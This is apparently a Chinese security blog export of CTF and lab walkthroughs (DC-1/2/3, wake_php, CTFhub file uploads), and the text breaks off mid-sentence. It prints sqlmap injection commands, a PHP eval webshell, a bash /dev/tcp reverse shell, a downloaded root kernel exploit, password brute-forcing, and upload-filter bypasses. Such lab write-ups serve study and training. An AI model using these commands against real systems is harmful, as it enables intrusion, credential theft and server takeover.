192.168.2.0/24\n\n发现目标主机\n端口扫描masscan --rate=100000 -p 0-65535 192.168.2.102\n\n没有扫描出结果\nnmap -T4 -sV -O -A -p- 192.168.2.102\n-T4(速度) -sV(版本扫描和开启的服务) -O(操作系统) -p-（全部端口）\n扫描出一个结果\n\n可以看到开启了80端口\n访问web页面访问192.168.2.102:80页面\n\n欢迎来到dc -3.\n这次，只有一面旗帜，一个入口，没有任何线索。\n要获得该标志，显然必须获得根权限。\n你如何成为根，取决于你自己，当然，也取决于系统。\n祝你好运，我希望你享受这个小小的挑战\n\n发现一个登录界面,经过尝试发现sql注入,暴力破解都没用\n目录发现dirsearch -u http://192.168.2.102/ -e*\n\n通过目录扫描发现了很多路径,访问看看\nhttp://192.168.2.102/administrator\n\n页面信息收集\n通过插件发现cms是joomia和wordpress\n通过查询得知有一个专门扫描joomla的工具joomscan\nkali里面安装joomscan工具的命令是apt-get install joomscan\njoomscan --url http://192.168.2.102开始扫描\n\n发现cms信息\n三:渗透测试漏洞发现用searchsploit搜索有无历史漏洞\nsearchsploit Joomla 3.7.0\n\n可以看到有一个sql注入漏洞能够利用\n漏洞利用cat /usr/share/exploitdb/exploits/php/webapps/42033.txt查看漏洞文件\n可以看到sqlmap的payload参数\nsqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]\n修改一下IP地址应该就能用了\npayload\nsqlmap -u &quot;http://192.168.2.102/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]\n\n成功爆出库名\n猜测我们要的数据在joomladb库里\n爆表名\nsqlmap -u &quot;http://192.168.2.102/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables -p list[fullordering]\n\n成功爆出表名,注意到有一个表名非常敏感**#_users**\n爆字段\nsqlmap -u &quot;http://192.168.2.102/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns -p list[fullordering]\n\n成功爆出字段名\n继续爆破数据\nsqlmap -u &quot;http://192.168.2.102/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C id,nmae,password,username --dump -p list[fullordering]\n\n发现一个加密账号\n我们可以用若干方法进行解密,经过上网查询,发现可以用kali的john进行解密\njohn​\tJohn the Ripper 是一款大受欢迎的、免费的开源软件。也是一个基于字典的快速破解密码的工具，是一款用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如 DES 、 MD4 、 MD5 等。 John the Ripper 支持字典破解方式和暴力破解方式。它支持多种不同类型的系统架构，包括 Unix 、 Linux 、 Windows 、 DOS 模式、 BeOS 和 OpenVMS ，主要目的是破解不够牢固的 Unix/Linux 系统密码\n一些参考文章\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/i_can1/article/details/107227565\nhttps://www.cnblogs.com/HelloCTF/p/13346125.html\nhttps://www.cnblogs.com/Junglezt/p/16048189.html\n将密文放进dc-3.txt\n\njohn工具破解密码\n\n可以看到密文是snoopy,可以登录后台了\n\n\n成功登录后台\n植入一句话木马Joomla后台可编辑模板，修改源码，我们利用这个功能，在template下面创建一个 test.php，写入一句话，蚁剑成功连接\nshell 路径 http:&#x2F;&#x2F;192.168.2.102&#x2F;templates&#x2F;beez3&#x2F;111.php 密码 1\n\n&lt;?php @eval($_REQUEST[&#39;1&#39;]);?&gt;\n\n\n\n可以看到权限很低,想办法提权\n\n反弹一个shell 到kali上（后台编辑模板时，也可直接写入反弹shell脚本，访问触发)\n反弹shell命令\nbash一句话为：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1\nnetcat: nc -e ip port &#x2F;bin&#x2F;bash\n\n这里这几个命令都不能成功,用下面这个\nbash -c &#39;bash -i &gt;&amp;  /dev/tcp/192.168.2.103/444 0&gt;&amp;1&#39;\n\n成功拿到shell\n提权查看内核版本信息\n\nlsb_release -a\n\n查询到目标靶机对应版本为 Ubuntu 16.04我们使用searchsploit查询是否有这个版本的漏洞\nsearchsploit Ubuntu 16.04\n\n查询到了很多有关的漏洞。这里我们使用39772进行提权\n提权思路：靶机上面是没有这个文件的，所以我们需要把这个文件cp到本地，再在kali渗透机上面搭建一个简易的服务器，操纵靶机下载这个文件并执行，拿到靶机root权限。\n查看文件\ncat /usr/share/exploitdb/exploits/linux/local/39772.txt\n查看漏洞介绍，并下载exp\n\n在得到的shell里下载并执行\nwget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip\n\n因为国内无法访问github所以一直失败,只能另寻他法\n开启kali的apache2服务：service apache2 start\n\n将文件复制到网页目录下：cp -r 39772 /var/www/html\n\n在靶机执行命令 wget http://192.168.2.103/39772.zip\n\n下载成功\n解压39772.zip文件unzip 39772.zip\ncd 39772\n\n解压exploit提权脚本tar包tar -xvf exploit.tar\ncd ebpf_mapfd_doubleput_exploit\n\n执行脚本，编译文件./compile.sh\n紧接着执行提权文件./doubleput\n\n成功提权至root\n找到flag\n\n","slug":"DC-3靶机渗透","date":"2023-01-12T03:44:50.821Z","categories_index":"渗透从入门到入土","tags_index":"DC系列靶机","author_index":"Abyssaler"},{"id":"37d11d52d9cb6b4b91ce5e3863cfb8d6","title":"DC-2靶机渗透","content":"DC-2靶机渗透全流程一:实验环境kali攻击机:192.168.2.103\n靶机:192.168.2.102\n二:信息收集主机发现:arp-scan -l\n\n端口发现masscan --rate=10000 -p 1-65535 192.168.2.102,以10000的速率扫描靶机的所有端口\n                                                                                                                                                                                                                \nnmap -p 80,7744 -sV -A 192.168.2.102   ,对指定端口的服务做综合详细扫描\n\n网站信息探测打不开192.168.2.108:80的原因:没有在本地设置hosts\n本地hosts文件位置:C:\\Windows\\System32\\drivers\\etc\n添加192.168.2.102 dc-2\n然后用ipconfig /flushdns更新dns缓存\n查询DNS缓存ipconfig /displaydns\nDNS解析顺序  本地DNS缓存&gt;hosts&gt;DNS服务器\n之后就能成功访问目标界面了\n\n利用Wappalyzer插件查看网站信息\n\n发现cms是wordpress\n找到flag1\n\n目录扫描dirsearch -u http://dc-2/ -e*  \n\n三:渗透测试通过flag1得知要用cewl工具收集网页信息生成密码破解口令字典\ncewlCewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。\n\n\n\n\n\n\n\n\n\nhttps://www.freebuf.com/articles/network/190128.html\n默认方法\n输入下列命令之后，爬虫会根据指定的URL和深度进行爬取，然后打印出可用于密码破解的字典：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F;\n\n\n\n保存字典文件\n为了方便大家记录，或者为将来的研究提供参考，Cewl可以将打印出的字典存储为文件。这里可以使用-w参数来将密码字典存储为text文件：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -w dict.txt\n\n我们可以使用下列命令查看密码字典是否存储成功，我们的存储路径为&#x2F;root &#x2F;dict.txt：\ncat dict.txt\n\n\n\n生成特定长度的字典\n如果你想生成指定长度的密码字典，你可以使用-m选项来设置：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -m 9\n\n上述命令将生成长度至少为9位的密码，，Cewl对目标网站进行了爬取，并打印出了长度至少为9位的密码\n从网站中获取Email\n你可以使用-e选项来启用Email参数，并配合-n选项来隐藏工具在爬取网站过程中生成的密码字典：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -n -e\n\n此时，工具成功在网站中发现了一个Email地址\n计算网站字典中重复的单词数量\n如果你想要计算目标网站中某个词的重复出现次数，你可以使用-c选项来开启参数计算功能：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -c\n\nCewl可以直接统计出目标网站中重复的单词数量\n增加爬取深度\n如果你想增加爬虫的爬取深度以生成更大的字典文件，你可以使用-d选项来指定爬取深度，默认的爬取深度为2：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -d 3\n\n\n\n提取调试信息\n你可以使用–debug选项来开启调试模式，这样就可以查看网站爬取过程中出现的错误和元数据了：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; --debug\n\n\n\nVerbose模式\n为了扩展网站爬取结果，并获取更加完整的数据报告，你可以使用-v选项来进入verbose模式。该模式下，Cewl会导出目标网站的详细数据：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -v\n\n\n\n生成包含数字和字符的字典\n如果你想生成包含数字和字符的字典文件，你可以在命令中使用–with-numbers选项：\ncewl http:&#x2F;&#x2F;testphp.vulnweb.com&#x2F; --with-numbers\n\n\n\nCewl摘要&#x2F;基础认证\n如果目标网站需要进行页面登录认证的话，我们就要使用下列参数来绕过页面认证的限制：\n–auth_type:                      Digest or basic.\n–auth_user:                     Authentication username.\n–auth_pass:                     Authentication password.\ncewl http:&#x2F;&#x2F;192.168.1.105&#x2F;dvwa&#x2F;login.php --auth_type Digest --auth_user admin--auth_pass password -v\n\n或者\ncewl http:&#x2F;&#x2F;192.168.1.105&#x2F;dvwa&#x2F;login.php --auth_type basic --auth_user admin--auth_pass password -v\n\n接收到的http响应码为200，并成功生成了字典\n代理URL\n如果目标网站设置了代理服务器的话，Cewl将无法使用默认命令来生成字典。此时你需要使用–proxy option选项来启用代理URL功能：\ncewl --proxy_host 192.168.1.103 --proxy_port 3128 -w dict.txt http:&#x2F;&#x2F;192.168.1.103&#x2F;wordpress&#x2F;\n\n\n\n使用cewl生成字典\ncewl http://dc-2 -w de-2.txt\n\nwpscan​\tWPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。\n\n\n\n\n\n\n\n\n\nhttps://www.freebuf.com/sectool/174663.html\nhttps://blog.csdn.net/liver100day/article/details/117585795\n扫描WordPress站点\n我们可以使用–enumerate选项来扫描并发现关于目标站点主题、插件和用户名信息。输入下列命令开始对服务器进行扫描：\nwpscan --url http:&#x2F;&#x2F;dc-2\n\n如果你不知道目标服务器的IP地址，你可以直接输入URL地址。\n主题扫描\n使用下列命令对主题进行扫描：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate t\n\n使用下列命令扫描主题中存在的漏洞：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vt\n\n枚举用户信息\nwpscan --url http:&#x2F;&#x2F;dc-2 -e u\n\n\n\n插件扫描\n插件可以扩展WordPress站点的功能，但很多插件中都存在安全漏洞，而这也会给攻击者提供可乘之机。\n我们可以使用下列命令扫描WordPress站点中安装的插件：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate p\n\n接下来，我们可以使用下列命令来扫描目标插件中的安全漏洞：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vp\n\n\n\n使用wpscan进行暴力破解\nwpscan --url http:&#x2F;&#x2F;dc-2 -P &#x2F;home&#x2F;liver100day&#x2F;桌面&#x2F;dc2_passwords.txt -U &#x2F;home&#x2F;liver100day&#x2F;桌面&#x2F;dc2_username.txt\n\n\n\n命令集合\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vp,vt,tt,u\n\n\n\n用wpscan收集用户信息\nwpscan --url http://dc-2 -e u枚举用户信息\n\n生成用户名字典\ncat &gt;&gt; dc-2-u.txt &lt;&lt; end\n\n对http用户进行暴力破解\nwpscan --url http://dc-2 -P dc-2.txt\n\n破解成功\n| Username: jerry, Password: adipiscing\n| Username: tom, Password: parturient\n\n\n\n利用用户信息进行登录\n\n找到flag2\n\n利用破解的账号尝试登录系统\n有时候一些程序用户很可能是系统用户\n利用ssh进行登录\nssh -p 7744 tom@192.168.2.102\nssh -p 7744 jerry@192.168.2.102\n\n\n成功登录tom\n发现flag3,但是同时发现很多指令不能使用\n\nrbash逃逸一些参考文章\n\n\n\n\n\n\n\n\n\nhttps://xz.aliyun.com/t/7642\nhttps://blog.csdn.net/qq_43168364/article/details/111830233\n查看路径搜索变量PATH\necho $PATH\n\n查看还有哪些命令能用\nls /home/tom/usr/bin\n\n用vi打开flag3\nvi flag3.txt\n\n打开后输入冒号,在vi编辑器的底部输入逃逸命令!/bin/sh\n\n但是我们直接输会遇到限制,过滤了&#x2F;\n\n转变思路,用set设置环境变量\n:set shell=/bin/sh通过set方式设置一个变量,把shell赋值给这个变量\n:shell\n\n\n\n成功绕过\n这里补充下正常Linux进入shell命令行的方法,直接输入/bin/sh\n\n此时发现很多命令仍然不能使用\n\n但可以发现此时提示的是命令没有找到,而不是权限不够,证明我们是能够使用这些命令的,只要路径正确\n\n路径搜索变量PATH变量是Linux系统存储可执行文件搜索路径的地方，等价于Windows系统的Path变量\necho $PATH\nexport PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games  把变量输出为全局变量\n\n此时就能正常使用命令了\n\n切换到jerry用户\nsu - jerry\n\n发现jerry只是个普通用户,想办法提权\n先找到flag4\n\n通过提示知道了要用git提权\n通过sudo -l查看可利用的指令\n发现可以用root权限执行git\n\n利用git提权这里用git提权，原理是git存在缓冲区溢出漏洞，在使用sudo git -p help时，不需要输入root密码即可以root权限执行这条命令。\nsudo git -p\n之后输入\n!/bin/bash\n这个-p的意思就是以分页的形式展示git的帮助信息,但是这里他会默认调用more来进行展示\n参考之前的rbash逃逸\n\n或者\nsudo git help config\n在末行命令模式输入 \n!/bin/bash 或 !&#39;sh&#39; \n完成提权\n拿到最终flag\n\n","slug":"DC-2靶机渗透","date":"2023-01-12T03:44:50.820Z","categories_index":"渗透从入门到入土","tags_index":"DC系列靶机","author_index":"Abyssaler"},{"id":"820ef2a811ea49a31eeb0d4db387a430","title":"DC-1靶机渗透","content":"dc-1靶机渗透过程详解一:实验环境kali攻击机:192.168.2.103\nDC-1靶机”192.168.1.128\n二:信息收集主机发现nmap -sP 192.168.1.0/24\n\n端口发现masscan --rate=10000 --ports 0-65535 192.168.1.128\n \n再利用nmap精细扫描端口\nnmap -T4 -sV -p22,80,111,38781 -A 192.168.1.128\n结果如下\n \n可以看到开放了两个重要端口22和80\n \n可以看到收集到了80端口的一系列敏感信息\n \n网站信息探测\n打开80端口对应的网站\n192.168.1.128:80\n \n利用插件找到了网站的cms\n三:渗透测试漏洞发现已知cms版本，搜索相应漏洞\n在漏洞库中找到对应版本我们可以利用的漏洞\n \n利用searchsploit drupal找到kali中保存的漏洞库\n \n打开msf\n \n搜索drupal漏洞\n \n调用漏洞模块\n \n利用info查看漏洞信息\n \n漏洞利用查看选项：show options命令\n指定靶机：set RHOSTS 192.168.1.128\n \n漏洞利用exploit命令\n \n可以看到得到了一个会话\n利用msf远程控制靶机\n \n进入交互式shell\npython -c ‘import pty;pty.spawn(“/bin/bash”)’\n \n找到第一个flag\n\n根据提示找到第二个flag\n \n找cms的配置文件\n \n看到配置文件里有数据库的账号和密码，尝试登录数据库\n \n\n登录成功\n查看user表中的信息\n \n\n可以看到密码被加密了，通过查阅资料可知密码是通过&#x2F;script&#x2F;password-hash.sh这个脚本进行的加密\n我们通过这个脚本自己修改一个密码\n \n在进入mysql数据库更新\n \n用我们之前自己设置的密码替换管理员密码\n用修改过的密码成功登录后台\n \n\n找到flag3\n\n通过cat &#x2F;etc&#x2F;passwd查看用户，找到flag4用户\n\n尝试用hydra对flag4用户暴力破解\nhydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.102 \n \n破解成功\n尝试远程登录\n \n找到第四个flag\n \n根据之前flag3的提示，我们知道了find这个命令有特殊的权限\n \n直接进行提权\n\n\n获得root权限\n \n拿到最后一个flag\n","slug":"DC-1靶机渗透","date":"2023-01-12T03:44:50.816Z","categories_index":"渗透从入门到入土","tags_index":"DC系列靶机","author_index":"Abyssaler"},{"id":"1a613abcdf9c626b905ba0d768be1622","title":"ctf笔记之wake_php","content":"源码：\n&lt;?php\nhighlight_file(__FILE__);\n    include(&quot;password.php&quot;);\n    if(isset($_POST[&#39;password&#39;]))\n    &#123;\n        if(strcmp($_POST[&#39;password&#39;],$password) &#x3D;&#x3D; 0)\n        &#123;\n            $a &#x3D; $_REQUEST[&#39;a&#39;];\n            if(is_numeric($a))&#123;\n                die(&quot;Oh No&quot;);\n            &#125;\n            switch($a)&#123;\n                case 0:\n                    echo &quot;NONONO&quot;;\n                    break;\n                case 1:\n                    echo &quot;You are hacker&quot;;\n                    break;\n                case 2:\n                    echo file_get_contents(&quot;&#x2F;flag&quot;);\n                    break;\n                default:\n                    echo &quot;123&quot;;\n            &#125;\n        &#125;\n        else\n        &#123;\n            die(&quot;what&#39;s a shame&quot;);\n        &#125;\n    &#125;\n?&gt;\n\n\n\n思路​\t首先分析源码得知:\n\n我们要从password.php页面中得到password和a的值\n把通过post传参过来的password值和$password变量做比较,让strcmp函数的值&#x3D;0,进入下一步\n要让is_numeric($a)判为false\n要让case判断$a为2\n\n思路分析完了,来看看具体的实现\nStrcmp()函数漏洞这个漏洞要php5.3之前的版本才有\nstrcmp漏洞\n首先来看一下函数\nint strcmp ( string $str1 , string $str2 )\n\n\n\n这个函数是用于比较字符串的函数\nnt strcmp ( string $str1 , string $str2 )参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。\n例子1:\n&lt;?php\necho strcmp(&quot;Hello world!&quot;,&quot;Hello world!&quot;); &#x2F;&#x2F; 两字符串相等  &#x2F;&#x2F;0\necho strcmp(&quot;Hello world!&quot;,&quot;Hello&quot;); &#x2F;&#x2F; string1 大于 string2  &#x2F;&#x2F;7\necho strcmp(&quot;Hello world!&quot;,&quot;Hello world! Hello!&quot;); &#x2F;&#x2F; string1 小于 string2  &#x2F;&#x2F;-7\n?&gt;\n\n\n\n例子2:\n证明这个函数区分大小写\n&lt;?php\necho strcmp(&quot;Hello&quot;,&quot;Hello&quot;); &#x2F;&#x2F;0\necho &quot;&lt;br&gt;&quot;;\necho strcmp(&quot;Hello&quot;,&quot;hELLo&quot;); &#x2F;&#x2F;-1\n?&gt;\n\n\n\n​\t可以看出这个函数传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。但是我们仍然可以使用这个漏洞对使用老版本php的网站进行渗透测试。\n解题思路if(strcmp($_POST[&#39;password&#39;],$password) &#x3D;&#x3D; 0)\n\n\n\n对于这段代码，我们能用什么办法绕过验证呢， 只要我们$_POST[‘password’]是一个数组或者一个object即可，但是上一个问题的时候说到过，只能上传字符串类型，那我们又该如何做呢\n其实php为了可以上传一个数组，会把结尾带一对中括号的变量，例如 xxx[]的name（就是$_POST中的key)\n要想这条语句判为真,我们需要在password.php页面构造password为一个数组数组传值为1，而strcmp要求我们传入字符串 strcmp函数判断不是字符串会报错，但是会return0 所以我们的目的达到了\n因为初学,一开始以为数组要这样构建,怎么都拿不到flag..\n\n经过询问朋友得知正确构造方式\n\n\n最后终于成功\n但是还是遇到了几个不解的地方,后来都解决了,这里写出来方便自己以后回忆\nphp中is_numeric函数的绕过$a &#x3D; $_REQUEST[&#39;a&#39;];\n            if(is_numeric($a))&#123;\n                die(&quot;Oh No&quot;);\n            &#125;\n            switch($a)&#123;\n                case 0:\n                    echo &quot;NONONO&quot;;\n                    break;\n                case 1:\n                    echo &quot;You are hacker&quot;;\n                    break;\n                case 2:\n                    echo file_get_contents(&quot;&#x2F;flag&quot;);\n                    break;\n                default:\n                    echo &quot;123&quot;;\n            &#125;\n\n\n\n看到这段代码我思考了很久(因为php基础不好),这里需要让 if(is_numeric($a))这个函数判false才能继续执行,而 is_numeric() 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE,所以这里出现了一个矛盾点**,$a不能等于2,不然无法执行,但是下面的条件语句又需要case $a为case 2**,基础不好的我陷入混乱\n查找资料的过程中发现了is_numeric()这个函数的绕过;\n$j &#x3D; $_POST[j];\nis_numeric($j)?die(&quot;&lt;br&#x2F;&gt;not is numeric &lt;br&#x2F;&gt;fail 10&quot;):NULL; \nif($j &gt; 1314)&#123;\necho &quot;&lt;br&#x2F;&gt;pass 10&quot;;&#125;\n\n\n\n方法一利用数组+十六进制来进行绕过\nj[]&#x3D;58B\n\n方法二is_ numeric() 判断变量是否为数字或数字字符串,不仅检查10进制，16进制是可以。is_ numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值,而%20空格字符只能放在数值后。所以,查看函数发现该函数对对于第-个空格字符会跳过空格字符判断,接着后面的判断!\nj&#x3D;1315%20\nj&#x3D;1315%00\n\n方法三php中当一个其他数据类型和数值类型的数据比较大小时，会先将其他数据类型转换成数值类型，这里输入类似9999a数据也可绕过\nj&#x3D;9999a\n\n\n\ncase语法特性讲到这里就还有最后一个问题了\n为什么$a&#x3D;2a但是在switch中case 2是true?\n在使用 switch 语句时应该注意以下几点：\n\n和 if 语句不同的是，switch 语句后面表达式的数据类型只能是整型或字符串，不能是 bool 型。通常这个表达式是一个变量名称，虽然 PHP 是弱类型语言，在 switch 后面表达式的变量可以是任意类型数据，但为了保证匹配执行的准确性，最好只使用整型或字符串中的一种类型。\n和 if 语句不同的是，switch 语句后面的花括号是必须有的。\ncase 语句的个数没有规定，可以无限增加。但 case 标签和 case 标签后面的值之间应该有一个空格，值后面必须有一个冒号，这是语法的一部分。\nswitch 匹配完成以后，将依次逐条执行匹配的分支模块中的语句，直到 switch 结构结束或者遇到了 break 语句才停止执行。所以，如果一个分支语句的后面没有写上 break 语句，程序将会继续执行下一个分支语句的内容。\n与 if 语句中的 else 类似，switch 语句中 default 标签直接在后面加上一个冒号，看似没有条件，其实是有条件的，条件就是“表达式”的值不能与前面任何一个 case 标签后的值相等，这时才执行 default 分支中的语句。default 标签和 if 中的 else 子句一样，它不是 switch 语句中必需的，可以省略。\n\n\n原来case还有这个讲究\n","slug":"ctf之wake_php","date":"2023-01-12T02:23:01.428Z","categories_index":"CTF","tags_index":"writeup,php","author_index":"Abyssaler"},{"id":"b97648e041829a6ba4fa127fa718e3d4","title":"CTFhub之web安全","content":"1.文件上传之双写后缀\n双写绕过原理：\n服务端对黑名单中的内容进行处理，且仅处理一次，所以可以通过双写后缀绕过．如，黑名单中有＂php＂字样，上传文件名为＂1.php＂ 上传后文件变成＂1.＂．\n如果直接上传111.php的话，会过滤后缀\n\n想到用burp suite抓包改后缀\n\n如图，一开始我想改成111.phpphp，想只过滤一次的话还剩一个php就成功了，结果被无情打脸\n\n后来得知服务端会对后缀名中所有的php进行过滤，所以修改思路\n\n改成这个样子\n服务端就只会过滤.pphphp中间的php，剩下的就是111.php了\n\n最后用蚁剑连接\n\n找到flag\n\n2.文件上传之00截断前置知识:\n\n\n\n\n\n\n\n\n文件上传漏洞“%00截断”绕过讲解”:https://www.fujieace.com/penetration-test/file-upload-00.html\n原理：如果是白名单检测的话，我们可以采用00截断绕过。00截断利用的是php的一个漏洞。在 php&lt;5.3.4 版本中，存储文件时处理文件名的函数认为0x00是终止符。于是在存储文件的时候，当函数读到 0x00(%00) 时，会认为文件已经结束。\n例如：我们上传 1.php%00.jpg 时，首先后缀名是合法的jpg格式，可以绕过前端的检测。上传到后端后，后端判断文件名后缀的函数会认为其是一个.jpg格式的文件，可以躲过白名单检测。但是在保存文件时，保存文件时处理文件名的函数在遇到%00字符认为这是终止符，于是丢弃后面的 .jpg，于是我们上传的 1.php%00.jpg 文件最终会被写入 1.php 文件中并存储在服务端。\n直接看题\n这里直接上传一句话木马文件会显示文件类型不匹配\n\n按F12打开开发者工具查看源代码，发现白名单\n分析源代码\nif (!empty($_POST[&#39;submit&#39;])) &#123;\n    $name &#x3D; basename($_FILES[&#39;file&#39;][&#39;name&#39;]);\n    $info &#x3D; pathinfo($name);\n    $ext &#x3D; $info[&#39;extension&#39;];\n    $whitelist &#x3D; array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);\n    if (in_array($ext, $whitelist)) &#123;\n        $des &#x3D; $_GET[&#39;road&#39;] . &quot;&#x2F;&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;\n        if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $des)) &#123;\n            echo &quot;&lt;script&gt;alert(&#39;上传成功&#39;)&lt;&#x2F;script&gt;&quot;;\n        &#125; else &#123;\n            echo &quot;&lt;script&gt;alert(&#39;上传失败&#39;)&lt;&#x2F;script&gt;&quot;;\n        &#125;\n    &#125; else &#123;\n        echo &quot;文件类型不匹配&quot;;\n    &#125;\n&#125;\n\n\n$_FILES 解释（搬自php手册）\n$_FILES 数组内容如下:\n\n$_FILES[‘myFile’][‘name’] 客户端文件的原名称。\n\n$_FILES[‘myFile’][‘type’] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image&#x2F;gif&quot;。\n\n$_FILES[‘myFile’][‘size’] 已上传文件的大小，单位为字节。\n\n$_FILES[‘myFile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在 php.ini 的 upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。\n\n$_FILES[‘myFile’][‘error’] 和该文件上传相关的错误代码。[‘error’] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在 PHP 4.3.0 之后变成了 PHP 常量。)\n\nbasename() 函数：返回路径中的文件名部分。\n$_name 是上传的文件名加后缀\n$_ext 得到的就是后缀名\n重点就在 $des这个变量\n得到的完整路径是 GET[‘road’]+随机数+日期加前面获得的后缀名\n————————————————\n版权声明：本文为CSDN博主「林一不是01」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_45785288&#x2F;article&#x2F;details&#x2F;108412899\n\nburp抓包后我们可以看见\n\n通过题目提示，此题可以用00截断来实现绕过上传验证，所以直接上传一个PHP一句话木马文件，在请求的时候开启抓包，修改\n\n根据之前的题目。我们可以判断出我们上传的文件摆放在upload目录下面。我们直接用蚁剑连接就行\n\n\n3.文件上传之MIME绕过前置知识:MIME概述：​\tMIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。\n​\t它是一个互联网标准，扩展了电子邮件标准，使其能够支持：\n​\t非ASCII字符文本；非文本格式附件（二进制、声音、图像等）；由多部分（multiple parts）组成的消息体；包含非ASCII字符的头信息（Header information）。\n\n\n\n\n\n\n\n\n\nMIME详解:\nhttps://www.runoob.com/http/mime-types.html\n什么是MIME类型校验​\tMIME类型校验就是我们在上传文件到服务端的时候，服务端会对客户端也就是我们上传的文件的Content-Type类型进行检测，如果是白名单所允许的，则可以正常上传，否则上传失败。\n开始做题:\n还是直接上传一个一句话木马,发现文件不匹配\n\n通过开发者工具也没找到白名单\n\n试着上传一个jpg文件,提示上传成功,证明白名单中有jpg\n\n将木马伪装成jpg上传再通过bp改文件后缀\n\n上传成功了\n还有第二种办法\n既然题目提示了是MIME绕过,那就用修改Content-Type类型的方法来试试\n\n首先通过查询得知jpeg文件的MIME类型是image&#x2F;jpeg\n\n如图,上传的是php文件,通过在bp中修改Content-Type为image&#x2F;jpeg来绕过\n\n接下来就是常规操作了\n\n\n4.文件上传漏洞之.htaccess前置知识:\n\n\n\n\n\n\n\n\n.htaccess详解\nhttps://cloud.tencent.com/developer/article/1824057\n什么是.htaccess？​\t.htaccess（超文本访问）是许多Web服务器根据目录应用设置的有用文件，允许在运行时覆盖Apache服务器的默认配置。使用.htaccess，我们可以在运行时轻松启用或禁用任何功能。通过htaccess文件，可以帮助我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许或组织特定的用户或者，目录的访问，禁止目录列表，配置默认文档等功能。\n​\t.htaccess是一个完整的文件名，不仅仅是文件的扩展名。\n​\t使用.htaccess配置时要注意，任何小错误都可能会阻止整个网站。很可能我们在.htaccess文件中会遇到状态码为500的错误。\n.htaccess的用途？我们可以使用.htaccess在运行时完成各种任务，下面列出了.htaccess的一些最常用的用法。\n1、重定向或重写URL\n使用.htaccess，我们可以轻松地将用户从一个URL重定向到另一个URL。此外，我们还可以在浏览器窗口中不更改URL的情况下将URL指向其他URL。\n2、启用密码保护\n使用.htaccess，我们可以在整个站点或特定目录访问上启用基本的HTTP身份验证。它可以防止未经授权访问数据。\n3、定义自定义错误页面\n当我们的网站在后端遇到任何错误时，Web服务器会显示每个错误的预定义错误页面。我们可以重新设计自己的错误页面，并在网站发生错误时向最终用户显示。\n4、允许或拒绝用户\n我们可以简单地